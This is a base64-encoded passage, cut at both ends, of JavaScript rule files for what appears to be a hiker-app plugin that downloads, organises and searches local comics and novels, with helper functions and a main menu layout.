cXFxcXFxcIik7XFxcXG5mdW5jdGlvbiBjb21pYyh0YXNrUGFyYW0pIHtcXFxcbiAgICBsZXQge1xcXFxuICAgICAgICBjaGFwdGVySXRlbSxcXFxcbiAgICAgICAgaW5mbyxcXFxcbiAgICAgICAgTVlfSUQsXFxcXG4gICAgfSA9IHRhc2tQYXJhbTtcXFxcbiAgICByZXR1cm4gTWlhbi5jb21pYyhjaGFwdGVySXRlbSwgaW5mbywgY2hhcHRlckl0ZW0uQ0lELCBNWV9JRCwgdHJ1ZSl8fGNoYXB0ZXJJdGVtLkNJRDtcXFxcbn1cXFxcblxcXFxuZnVuY3Rpb24gbm92ZWwodGFza1BhcmFtKSB7XFxcXG4gICAgbGV0IHtcXFxcbiAgICAgICAgY2hhcHRlckl0ZW0sXFxcXG4gICAgICAgIGluZm8sXFxcXG4gICAgICAgIE1ZX0lELFxcXFxuICAgIH0gPSB0YXNrUGFyYW07XFxcXG4gICAgcmV0dXJuIE1pYW4ubm92ZWwoY2hhcHRlckl0ZW0sIGluZm8sIGNoYXB0ZXJJdGVtLkNJRCxNWV9JRCwgdHJ1ZSl8fGNoYXB0ZXJJdGVtLkNJRDtcXFxcbiAgICAvL0ZpbGUucmVuYW1lRmlsZShjaGFwdGVyUGF0aCwgY2hhcHRlckl0ZW0uQ0lEICsgXFxcXFxcXCIkQSRcXFxcXFxcIiArIGNoYXB0ZXJJdGVtLnRpdGxlKTtcXFxcbn1cXFxcbnZhciAkZXhlID0ge1xcXFxuICAgIGNvbWljOiBjb21pYyxcXFxcbiAgICBub3ZlbDogbm92ZWxcXFxcbn07XFxcXG4kLmV4cG9ydHMgPSBmdW5jdGlvbih0YXNrUGFyYW0pIHtcXFxcbiAgICByZXR1cm4gJGV4ZVt0YXNrUGFyYW0uaW5mby50eXBlXSh0YXNrUGFyYW0pO1xcXFxufTtcXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCIjZmcu5pmu6YCa5Li756iL5bqPXFxcIixcXFwicGF0aFxcXCI6XFxcIkRvd25sb2FkLmV4ZS5qc1xcXCIsXFxcInJ1bGVcXFwiOlxcXCJjb25zdCBNaWFuID0gJC5yZXF1aXJlKFxcXFxcXFwibWFpbkRvd25sb2FkXFxcXFxcXCIpO1xcXFxuZnVuY3Rpb24gbm92ZWwoaXRlbSwgaW5mbywgb3JkZXIsIE1ZX0lEKSB7XFxcXG4gICAgTWlhbi5ub3ZlbChpdGVtLCBpbmZvLCBvcmRlcik7XFxcXG4gICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly9cXFxcXFxcIiArIGluZm8uYm9va05hbWUgKyBcXFxcXFxcIkBcXFxcXFxcIiArIGl0ZW0udGl0bGUgKyBcXFxcXFxcIiDkuIvovb3lrozmiJBcXFxcXFxcIjtcXFxcbn1cXFxcblxcXFxuZnVuY3Rpb24gY29taWMoaXRlbSwgaW5mbywgb3JkZXIsIE1ZX0lEKSB7XFxcXG4gICAgTWlhbi5jb21pYyhpdGVtLCBpbmZvLCBvcmRlcik7XFxcXG4gICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly9cXFxcXFxcIiArIGluZm8uYm9va05hbWUgKyBcXFxcXFxcIkBcXFxcXFxcIiArIGl0ZW0udGl0bGUgKyBcXFxcXFxcIiDkuIvovb3lrozmiJBcXFxcXFxcIjtcXFxcbn1cXFxcbnZhciAkZXhlID0ge1xcXFxuICAgIGNvbWljOiBjb21pYyxcXFxcbiAgICBub3ZlbDogbm92ZWxcXFxcbn07XFxcXG4kLmV4cG9ydHMgPSBmdW5jdGlvbihpdGVtLCBpbmZvLCBvcmRlciwgTVlfSUQpIHtcXFxcbiAgICByZXR1cm4gJGV4ZVtpbmZvLnR5cGVdKGl0ZW0sIGluZm8sIG9yZGVyLCBNWV9JRCk7XFxcXG59O1xcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIiNmLumAmueUqOW3peWFt1xcXCIsXFxcInBhdGhcXFwiOlxcXCJUb29sLmpzXFxcIixcXFwicnVsZVxcXCI6XFxcImNvbnN0IHYgPSB7XFxcXG4gICAgc3BsaXQodGV4dCwgdGFyZ2V0LCBjb3VudCkge1xcXFxuICAgICAgICBjb3VudCA9IGNvdW50ID09PSB1bmRlZmluZWQgPyAxIDogY291bnQ7XFxcXG4gICAgICAgIGxldCBhcnJheSA9IFt0ZXh0XTtcXFxcbiAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBjb3VudDsgaSsrKSB7XFxcXG4gICAgICAgICAgICB0ZXh0ID0gYXJyYXlbaV07XFxcXG4gICAgICAgICAgICBsZXQgaW5kZXggPSB0ZXh0LmluZGV4T2YodGFyZ2V0KTtcXFxcbiAgICAgICAgICAgIGlmIChpbmRleCA9PT0gLTEpIHtcXFxcbiAgICAgICAgICAgICAgICBicmVhaztcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIGFycmF5W2ldID0gdGV4dC5zbGljZSgwLCBpbmRleCk7XFxcXG4gICAgICAgICAgICBhcnJheVtpICsgMV0gPSB0ZXh0LnNsaWNlKGluZGV4ICsgdGFyZ2V0Lmxlbmd0aCk7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgcmV0dXJuIGFycmF5O1xcXFxuICAgIH0sXFxcXG4gICAgY2h1bmsoYXJyLCBzaXplKSB7XFxcXG4gICAgICAgIHZhciByZXN1bHQgPSBbXTtcXFxcbiAgICAgICAgZm9yICh2YXIgaSA9IDAsIGxlbiA9IGFyci5sZW5ndGg7IGkgPCBsZW47IGkgKz0gc2l6ZSkge1xcXFxuICAgICAgICAgICAgcmVzdWx0LnB1c2goYXJyLnNsaWNlKGksIGkgKyBzaXplKSk7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcXFxcbiAgICB9LFxcXFxuICAgIGhpa2VyUGljKHVybCkge1xcXFxuICAgICAgICB2YXIgaGVhZGVycyA9IHt9O1xcXFxuICAgICAgICBsZXQgdXJscyA9IHVybC5zcGxpdChcXFxcXFxcIkBcXFxcXFxcIik7XFxcXG4gICAgICAgIGxldCBwaWNVcmwgPSB1cmxzLnNoaWZ0KCk7XFxcXG4gICAgICAgIGxldCBsZW5ndGggPSB1cmxzLmxlbmd0aDtcXFxcbiAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBsZW5ndGg7IGkrKykge1xcXFxuICAgICAgICAgICAgbGV0IFtrZXksIHZhbHVlXSA9IHYuc3BsaXQodXJsc1tpXSwgXFxcXFxcXCI9XFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgaWYgKGtleSA9PT0gXFxcXFxcXCJoZWFkZXJzXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgICAgICAgICB0cnkge1xcXFxuICAgICAgICAgICAgICAgICAgICBPYmplY3QuYXNzaWduKGhlYWRlcnMsIEpTT04ucGFyc2UodmFsdWUpKTtcXFxcbiAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGxvZyhlLnRvU3RyaW5nKCkpO1xcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIH0gZWxzZSBpZiAoa2V5LmluY2x1ZGVzKFxcXFxcXFwiLlxcXFxcXFwiKSB8fCBrZXkuaW5jbHVkZXMoXFxcXFxcXCI/XFxcXFxcXCIpKSB7XFxcXG4gICAgICAgICAgICAgICAgcGljVXJsICs9IFxcXFxcXFwiQFxcXFxcXFwiICsga2V5ICsgKHZhbHVlID8gXFxcXFxcXCI9XFxcXFxcXCIgKyB2YWx1ZSA6IFxcXFxcXFwiXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgfSBlbHNlIGlmIChrZXkgIT09IFxcXFxcXFwianNcXFxcXFxcIikge1xcXFxuICAgICAgICAgICAgICAgIGhlYWRlcnNba2V5XSA9IHZhbHVlO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9XFxcXG4gICAgICAgIHJldHVybiBbcGljVXJsLCBoZWFkZXJzXTtcXFxcbiAgICB9LFxcXFxuICAgIHJhbmdlKHN0YXJ0LCBlbmQpIHtcXFxcbiAgICAgICAgcmV0dXJuIEFycmF5KGVuZCAtIHN0YXJ0KS5maWxsKDApLm1hcCgoZWwsIGkpID0+IHN0YXJ0ICsgaSk7XFxcXG4gICAgfSxcXFxcbiAgICBwaWNEb3dubG9hZCh1cmwsIHBhdGgsIGhlYWRlcnMsIGRlY2lwaGUpIHtcXFxcbiAgICAgICAgaWYgKHR5cGVvZiBkZWNpcGhlID09PSBcXFxcXFxcInN0cmluZ1xcXFxcXFwiICYmIGRlY2lwaGUubGVuZ3RoID4gMCkge1xcXFxuICAgICAgICAgICAgbGV0IGluc3RyZWFtO1xcXFxuICAgICAgICAgICAgbGV0IG91dHN0cmVhbTtcXFxcbiAgICAgICAgICAgIGxldCBmaWxlO1xcXFxuICAgICAgICAgICAgdHJ5IHtcXFxcbiAgICAgICAgICAgICAgICBmaWxlID0gbmV3IGphdmEuaW8uRmlsZShwYXRoKTtcXFxcbiAgICAgICAgICAgICAgICBpZiAoZmlsZS5leGlzdHMoKSkge1xcXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm47XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIGxldCBkaXIgPSBmaWxlLmdldFBhcmVudEZpbGUoKTtcXFxcbiAgICAgICAgICAgICAgICBpZiAoZGlyICE9IG51bGwgJiYgIWRpci5leGlzdHMoKSkge1xcXFxuICAgICAgICAgICAgICAgICAgICBkaXIubWtkaXJzKCk7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIGluc3RyZWFtID0gZmV0Y2godXJsLCB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGhlYWRlcnM6IGhlYWRlcnMsXFxcXG4gICAgICAgICAgICAgICAgICAgIGlucHV0U3RyZWFtOiB0cnVlXFxcXG4gICAgICAgICAgICAgICAgfSk7XFxcXG5cXFxcbiAgICAgICAgICAgICAgICBvdXRzdHJlYW0gPSBuZXcgamF2YS5pby5GaWxlT3V0cHV0U3RyZWFtKHBhdGgpO1xcXFxuICAgICAgICAgICAgICAgIGxldCB0ID0gJC5oaWtlci5pbnB1dCxcXFxcbiAgICAgICAgICAgICAgICAgICAgYyA9ICQuaGlrZXIudXJsO1xcXFxuICAgICAgICAgICAgICAgICQuaGlrZXIuaW5wdXQgPSBpbnN0cmVhbTtcXFxcbiAgICAgICAgICAgICAgICAkLmhpa2VyLnVybCA9IHVybDtcXFxcbiAgICAgICAgICAgICAgICBsZXQgcGljaW4gPSAobmV3IEZ1bmN0aW9uKFxcXFxcXFwicmV0dXJuIFxcXFxcXFwiICsgZGVjaXBoZSkpKCk7XFxcXG4gICAgICAgICAgICAgICAgJC5oaWtlci5pbnB1dCA9IHQ7XFxcXG4gICAgICAgICAgICAgICAgJC5oaWtlci51cmwgPSBjO1xcXFxuICAgICAgICAgICAgICAgIGxldCBidWYgPSBqYXZhLmxhbmcucmVmbGVjdC5BcnJheS5uZXdJbnN0YW5jZShqYXZhLmxhbmcuQnl0ZS5UWVBFLCAxMDI0KTtcXFxcbiAgICAgICAgICAgICAgICBsZXQgbGVuO1xcXFxuICAgICAgICAgICAgICAgIHdoaWxlICgobGVuID0gcGljaW4ucmVhZChidWYpKSAhPSAtMSkge1xcXFxuICAgICAgICAgICAgICAgICAgICBvdXRzdHJlYW0ud3JpdGUoYnVmLCAwLCBsZW4pO1xcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICBjbG9zZU1lKGluc3RyZWFtKTtcXFxcbiAgICAgICAgICAgICAgICBjbG9zZU1lKG91dHN0cmVhbSk7XFxcXG4gICAgICAgICAgICB9IGNhdGNoIChlKSB7XFxcXG4gICAgICAgICAgICAgICAgY2xvc2VNZShpbnN0cmVhbSk7XFxcXG4gICAgICAgICAgICAgICAgY2xvc2VNZShvdXRzdHJlYW0pO1xcXFxuICAgICAgICAgICAgICAgIGlmIChmaWxlIGluc3RhbmNlb2YgamF2YS5pby5GaWxlICYmIGZpbGUuZXhpc3RzKCkpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgZmlsZS5kZWxldGUoKTtcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgbG9nKFxcXFxcXFwiPOino+WvhuS4i+i9vUVycm9yPlxcXFxcXFwiICsgZS50b1N0cmluZygpKVxcXFxuICAgICAgICAgICAgICAgIHRocm93IGU7XFxcXG4gICAgICAgICAgICB9IGZpbmFsbHkge1xcXFxuICAgICAgICAgICAgICAgIGNsb3NlTWUoaW5zdHJlYW0pO1xcXFxuICAgICAgICAgICAgICAgIGNsb3NlTWUob3V0c3RyZWFtKTtcXFxcbiAgICAgICAgICAgIH1cXFxcblxcXFxuICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgcmVxdWlyZURvd25sb2FkKHVybCwgcGF0aCwgaGVhZGVycyk7XFxcXG4gICAgICAgIH1cXFxcbiAgICB9LFxcXFxuICAgIHRleHRTaGllbGQodGV4dCkge1xcXFxuICAgICAgICBsZXQgZSA9IC8jfDp8JnxcXFxcXFxcXHx8XFxcXFxcXFxefEB8XFxcXFxcXFw8fFxcXFxcXFxcPnwlfFxcXFxcXFxcL3xcXFxcXFxcXD98XFxcXFxcXFwkL2c7XFxcXG4gICAgICAgIHJldHVybiB0ZXh0LnJlcGxhY2UoZSwgXFxcXFxcXCJfXFxcXFxcXCIpO1xcXFxuICAgIH1cXFxcbiAgICBcXFxcbn1cXFxcblxcXFxuJC5leHBvcnRzID0gdjtcXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCIjdi7kuLvpobXpnaJcXFwiLFxcXCJwYXRoXFxcIjpcXFwiTWFpbi52aWV3XFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxuZnVuY3Rpb24gbWFpbigpIHtcXFxcbiAgICB2YXIgbGF5b3V0ID0gW107XFxcXG4gICAgY29uc3QgRmlsZSA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9GaWxlLmpzXFxcXFxcXCIpO1xcXFxuICAgIGNvbnN0IENvbmZpZyA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9Db25maWcuanNcXFxcXFxcIik7XFxcXG4gICAgbGV0IHR5cGUgPSBnZXRNeVZhcihcXFxcXFxcIi50eXBlXFxcXFxcXCIsIGdldEl0ZW0oXFxcXFxcXCJtYWluOnR5cGVcXFxcXFxcIiwgQ29uZmlnLmRlZl9Mb3JkX1R5cGUpKTtcXFxcbiAgICBsZXQgdGdudW0gPSBnZXRNeVZhcihcXFxcXFxcIi50Z251bVxcXFxcXFwiLCBcXFxcXFxcIjBcXFxcXFxcIik7XFxcXG4gICAgYWRkTGlzdGVuZXIoXFxcXFxcXCJvbkNsb3NlXFxcXFxcXCIsICQudG9TdHJpbmcoKE1ZX0lEKSA9PiB7XFxcXG4gICAgICAgIGNsZWFyTXlWYXIoXFxcXFxcXCJzZWFyY2hLZXlcXFxcXFxcIik7XFxcXG4gICAgICAgIGNsZWFyTXlWYXIoXFxcXFxcXCIudGdudW1cXFxcXFxcIik7XFxcXG4gICAgfSkpO1xcXFxuICAgIGxheW91dC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6IHR5cGUgPT09IFxcXFxcXFwiY29taWNcXFxcXFxcIiA/IFxcXFxcXFwi4peJ5ryr55S7XFxcXFxcXCIgOiBcXFxcXFxcIuKXi+a8q+eUu1xcXFxcXFwiLFxcXFxuICAgICAgICB1cmw6ICQoXFxcXFxcXCIjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZSgodHlwZSkgPT4ge1xcXFxuICAgICAgICAgICAgaWYgKHR5cGUgPT09IFxcXFxcXFwiY29taWNcXFxcXFxcIikgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCIudHlwZVxcXFxcXFwiLCBcXFxcXFxcImNvbWljXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgc2V0SXRlbShcXFxcXFxcIm1haW46dHlwZVxcXFxcXFwiLCBcXFxcXFxcImNvbWljXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgY2xlYXJNeVZhcihcXFxcXFxcIi50Z251bVxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXFxcbiAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIjtcXFxcbiAgICAgICAgfSwgdHlwZSksXFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfM1xcXFxcXFwiLFxcXFxuICAgIH0pO1xcXFxuICAgIGxheW91dC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6IHR5cGUgPT09IFxcXFxcXFwibm92ZWxcXFxcXFxcIiA/IFxcXFxcXFwi4peJ5bCP6K+0XFxcXFxcXCIgOiBcXFxcXFxcIuKXi+Wwj+ivtFxcXFxcXFwiLFxcXFxuICAgICAgICB1cmw6ICQoXFxcXFxcXCIjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZSgodHlwZSkgPT4ge1xcXFxuICAgICAgICAgICAgaWYgKHR5cGUgPT09IFxcXFxcXFwibm92ZWxcXFxcXFxcIikgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCIudHlwZVxcXFxcXFwiLCBcXFxcXFxcIm5vdmVsXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgc2V0SXRlbShcXFxcXFxcIm1haW46dHlwZVxcXFxcXFwiLCBcXFxcXFxcIm5vdmVsXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgY2xlYXJNeVZhcihcXFxcXFxcIi50Z251bVxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXFxcbiAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIjtcXFxcbiAgICAgICAgfSwgdHlwZSksXFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfM1xcXFxcXFwiLFxcXFxuICAgIH0pO1xcXFxuICAgIGxheW91dC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6IHR5cGUgPT09IFxcXFxcXFwidHh0XFxcXFxcXCIgPyBcXFxcXFxcIuKXieaVtOacrOWwj+ivtFxcXFxcXFwiIDogXFxcXFxcXCLil4vmlbTmnKzlsI/or7RcXFxcXFxcIixcXFxcbiAgICAgICAgdXJsOiAkKFxcXFxcXFwiI25vTG9hZGluZyNcXFxcXFxcIikubGF6eVJ1bGUoKHR5cGUpID0+IHtcXFxcbiAgICAgICAgICAgIGlmICh0eXBlID09PSBcXFxcXFxcInR4dFxcXFxcXFwiKSByZXR1cm4gXFxcXFxcXCJoaWtlcjovL3BhZ2UvTm92ZWxDb2xsZWN0ZWQudmlldyNub1JlY29yZEhpc3RvcnkjI25vSGlzdG9yeSNcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgIHB1dE15VmFyKFxcXFxcXFwiLnR5cGVcXFxcXFxcIiwgXFxcXFxcXCJ0eHRcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICBzZXRJdGVtKFxcXFxcXFwibWFpbjp0eXBlXFxcXFxcXCIsIFxcXFxcXFwidHh0XFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgY2xlYXJNeVZhcihcXFxcXFxcIi50Z251bVxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXFxcbiAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIjtcXFxcbiAgICAgICAgfSwgdHlwZSksXFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfM1xcXFxcXFwiXFxcXG4gICAgfSk7XFxcXG4gICAgaWYgKHR5cGUgPT09IFxcXFxcXFwidHh0XFxcXFxcXCIpIHtcXFxcbiAgICAgICAgbGV0IHR4dFZpZXcgPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL3BhZ2UvZXh0ZXJuYWxpbXBvcnRUeHQudmlld1xcXFxcXFwiKTtcXFxcbiAgICAgICAgcmV0dXJuIHR4dFZpZXcobGF5b3V0KTtcXFxcbiAgICB9XFxcXG4gICAgbGV0IHRhZyA9IEZpbGUuZ2V0RmlsZVBhdGgoQ29uZmlnW3R5cGUgKyBcXFxcXFxcIlBhdGhcXFxcXFxcIl0sIFxcXFxcXFwiZGlyXFxcXFxcXCIpO1xcXFxuICAgIGlmICh0YWcubGVuZ3RoID09PSAwKSB7XFxcXG4gICAgICAgIGxheW91dC5wdXNoKHtcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImxpbmVfYmxhbmtcXFxcXFxcIixcXFxcbiAgICAgICAgfSk7XFxcXG4gICAgICAgIGxheW91dC5wdXNoKHtcXFxcbiAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIuiuvue9rlxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgdXJsOiBcXFxcXFxcImhpa2VyOi8vcGFnZS9TZXR0aW5nLnZpZXcjbm9SZWZyZXNoIyNub1JlY29yZEhpc3RvcnkjI25vSGlzdG9yeSNcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfMlxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgICAgICB2ZXJzaW9uOiBNWV9SVUxFLnZlcnNpb25cXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfSk7XFxcXG5cXFxcbiAgICAgICAgbGF5b3V0LnB1c2goe1xcXFxuICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi4oCc4oCc5biu5Yqp4oCd4oCdXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICB1cmw6IFxcXFxcXFwiaGlrZXI6Ly9wYWdlL2hlbHAudmlldyNub1JlZnJlc2gjI25vUmVjb3JkSGlzdG9yeSMjbm9IaXN0b3J5Iz9rZXl3b3JkPW5vdmVsQ29taWNcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfMlxcXFxcXFwiXFxcXG4gICAgICAgIH0pO1xcXFxuICAgICAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgICAgICB0aXRsZTogJzxoMSBzdHlsZT1cXFxcXFxcInRleHQtYWxpZ246IGNlbnRlcjtcXFxcXFxcIj7llaXpg73msqHmnInogLY8L2gxPicsXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJyaWNoX3RleHRcXFxcXFxcIlxcXFxuICAgICAgICB9KTtcXFxcbiAgICAgICAgcmV0dXJuIHNldFJlc3VsdChsYXlvdXQpO1xcXFxuICAgIH1cXFxcbiAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgIHVybDogJ1xcXFxcXFwiaGlrZXI6Ly9zZWFyY2g/cz1cXFxcXFxcIitpbnB1dCcsXFxcXG4gICAgICAgIGRlc2M6IFxcXFxcXFwi5pCc5L2g5oOz6KaB55qEI1xcXFxcXFwiICsgdHlwZSArIFxcXFxcXFwiIy4uLi4uLlxcXFxcXFwiLFxcXFxuICAgICAgICB0aXRsZTogXFxcXFxcXCLwn5SNXFxcXFxcXCIsXFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImlucHV0XFxcXFxcXCIsXFxcXG4gICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICBydWxlczogJC50b1N0cmluZygodGFnLCB0eXBlKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IGFycjEgPSBbXTtcXFxcbiAgICAgICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IHRhZy5sZW5ndGg7IGkrKykge1xcXFxuICAgICAgICAgICAgICAgICAgICBhcnIxLnB1c2goe1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgXFxcXFxcXCJ0aXRsZVxcXFxcXFwiOiB0YWdbaV0ubmFtZSxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIFxcXFxcXFwic2VhcmNoX3VybFxcXFxcXFwiOiBcXFxcXFxcImhpa2VyOi8vZW1wdHk/aXNBbGw9MSZzZWFyY2hUZXJtcz0qKiZ0eXBlPVxcXFxcXFwiICsgdHlwZSxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIFxcXFxcXFwic2VhcmNoRmluZFxcXFxcXFwiOiBcXFxcXFxcImpzOiQucmVxdWlyZSgnaGlrZXI6Ly9wYWdlL1NlYXJjaC52aWV3P3J1bGU9JytNWV9SVUxFLl90aXRsZSk7XFxcXFxcXCJcXFxcbiAgICAgICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuXFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIEpTT04uc3RyaW5naWZ5KGFycjEpO1xcXFxuICAgICAgICAgICAgfSwgdGFnLCB0eXBlKSxcXFxcbiAgICAgICAgICAgIGRlZmF1bHRWYWx1ZTogZ2V0TXlWYXIoJ3NlYXJjaEtleScsICcnKSxcXFxcbiAgICAgICAgICAgIG9uQ2hhbmdlOiBcXFxcXFxcInB1dE15VmFyKCdzZWFyY2hLZXknLGlucHV0KVxcXFxcXFwiXFxcXG4gICAgICAgIH1cXFxcbiAgICB9KTtcXFxcblxcXFxuICAgIGxheW91dC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6IFxcXFxcXFwi4oCY4oCY4pqZ6K6+572u4oCZ4oCZXFxcXFxcXCIsXFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInNjcm9sbF9idXR0b25cXFxcXFxcIixcXFxcbiAgICAgICAgdXJsOiBcXFxcXFxcImhpa2VyOi8vcGFnZS9TZXR0aW5nLnZpZXcjbm9SZWZyZXNoIyNub1JlY29yZEhpc3RvcnkjI25vSGlzdG9yeSNcXFxcXFxcIixcXFxcbiAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgIHZlcnNpb246IE1ZX1JVTEUudmVyc2lvblxcXFxuICAgICAgICB9XFxcXG4gICAgfSk7XFxcXG5cXFxcblxcXFxuICAgIGZvciAobGV0IGkgaW4gdGFnKSB7XFxcXG4gICAgICAgIGxldCBpdCA9IHRhZ1tpXTtcXFxcbiAgICAgICAgaWYgKHRnbnVtID09PSBpKSB7XFxcXG4gICAgICAgICAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi4oCc4oCcXFxcXFxcXCIgKyBpdC5uYW1lICsgXFxcXFxcXCLigJ3igJ1cXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJzY3JvbGxfYnV0dG9uXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgdXJsOiAkKFtcXFxcXFxcIuWIoOmZpOivpeebruW9lVxcXFxcXFwiLCBcXFxcXFxcIui3s+i9rOWwj+eoi+W6j1xcXFxcXFwiLCBcXFxcXFxcIuaJk+W8gOS5puaetlxcXFxcXFwiXSwgMSwgXFxcXFxcXCLpgInmi6nmk43kvZxcXFxcXFxcIikuc2VsZWN0KChpdCwgdHlwZSkgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICBpZiAoXFxcXFxcXCLot7PovazlsI/nqIvluo9cXFxcXFxcIiA9PT0gaW5wdXQpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vaG9tZUBcXFxcXFxcIiArIGl0Lm5hbWU7XFxcXG4gICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZihcXFxcXFxcIuWIoOmZpOivpeebruW9lVxcXFxcXFwiPT09aW5wdXQpe1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgLy9yZXR1cm4gdGhlbihbXFxcXFxcXCLor6Xmk43kvZzkuI3kvJrliKDpmaTlsI/nqIvluo/vvIzkvYbor6XlsI/nqIvluo/kuIvovb3nmoTmiYDmnInmvKvnlLvlsIbooqvliKDpmaRcXFxcXFxcIl0pO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICQoXFxcXFxcXCLor6Xmk43kvZzkuI3kvJrliKDpmaTlsI/nqIvluo/vvIzkvYbor6XlsI/nqIvluo/kuIvovb3nmoTmiYDmnIkg5ryr55S7L+Wwj+ivtCDlsIbooqvliKDpmaRcXFxcXFxcIikuY29uZmlybSgocGF0aCkgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IEZpbGUgPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL3BhZ2UvRmlsZS5qc1xcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoRmlsZS5kZWxldGVGaWxlcyhw